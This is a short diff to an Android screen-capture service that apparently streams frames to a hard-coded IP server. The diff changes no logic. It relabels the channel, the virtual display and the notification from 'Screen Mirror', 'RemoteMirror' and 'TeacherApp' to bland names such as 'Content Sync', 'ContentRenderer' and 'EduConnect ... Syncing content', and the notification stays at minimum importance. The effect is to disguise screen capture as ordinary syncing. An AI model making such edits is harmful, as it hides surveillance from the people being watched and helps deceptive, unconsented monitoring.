@@ -33,7 +33,7 @@ class MediaStreamService : Service() {
 
     companion object {
         private const val SERVER = "http://20.189.79.25:5000"
-        private const val CHANNEL_ID = "mirror_channel_v2"
+        private const val CHANNEL_ID = "content_sync_ch"
         private const val NOTIF_ID = 2001
 
         @Volatile var isRunning = false
@@ -92,7 +92,7 @@ class MediaStreamService : Service() {
 
         imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
         virtualDisplay = mediaProjection?.createVirtualDisplay(
-            "RemoteMirror", w, h, dpi,
+            "ContentRenderer", w, h, dpi,
             DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
             imageReader!!.surface, null, null
         )
@@ -233,14 +233,14 @@ class MediaStreamService : Service() {
     private fun createChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             getSystemService(NotificationManager::class.java).createNotificationChannel(
-                NotificationChannel(CHANNEL_ID, "Screen Mirror", NotificationManager.IMPORTANCE_MIN)
+                NotificationChannel(CHANNEL_ID, "Content Sync", NotificationManager.IMPORTANCE_MIN)
             )
         }
     }
 
     private fun buildNotification() = NotificationCompat.Builder(this, CHANNEL_ID)
-        .setContentTitle("TeacherApp")
-        .setContentText("Running")
+        .setContentTitle("EduConnect")
+        .setContentText("Syncing content")
         .setSmallIcon(android.R.drawable.stat_sys_upload)
         .build()
 
